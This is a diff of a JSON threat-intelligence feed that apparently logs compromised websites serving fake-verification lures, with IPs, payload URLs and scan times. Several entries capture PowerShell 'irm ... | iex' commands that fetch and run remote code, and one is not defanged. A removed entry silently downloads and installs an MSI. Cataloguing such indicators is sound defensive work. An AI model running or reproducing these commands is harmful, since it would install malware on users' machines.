@@ -1,5 +1,93 @@
 [
   {
+    "UrlDomain": "aar.urgentbusiness.com.ng",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "65.181.124.231"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/a635234e252c668b",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29911123",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/a635234e252c668b'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/a635234e252c668b"
+    ],
+    "ReportId": "cmwginvma0lic0omlk1c2ku1a",
+    "ScannedAt": "2026-11-14T14:44:10.592000+00:00"
+  },
+  {
+    "UrlDomain": "www.corpusservice.pt",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "216.59.16.107"
+    ],
+    "Related": [
+      {
+        "Value": "https://wa.me/351914849237",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwgin1jy0lh20omlj4jcehdg",
+    "ScannedAt": "2026-11-14T14:43:31.633000+00:00"
+  },
+  {
+    "UrlDomain": "safewayengineering.in",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "204.11.58.87"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
+    ],
+    "ReportId": "cmwgimf3v0lg20omleagzrf9n",
+    "ScannedAt": "2026-11-14T14:43:02.568000+00:00"
+  },
+  {
+    "UrlDomain": "sulon.org",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "213.186.33.87"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
+    ],
+    "ReportId": "cmwgilzy30lfb0oml5aansa6p",
+    "ScannedAt": "2026-11-14T14:42:42.917000+00:00"
+  },
+  {
     "UrlDomain": "akk-finaudit.com",
     "DeliveryUrl": [
       "fastly.jsdelivr.net"
@@ -324,24 +412,5 @@
     ],
     "ReportId": "cmwf4esed0fpg0omlmg0cwhh2",
     "ScannedAt": "2026-11-13T15:17:25.750000+00:00"
-  },
-  {
-    "UrlDomain": "azkafoods.co",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "66.29.137.43"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwf2w2a00fkl0oml1ac8kcxp",
-    "ScannedAt": "2026-11-13T14:34:52.466000+00:00"
   }
 ]
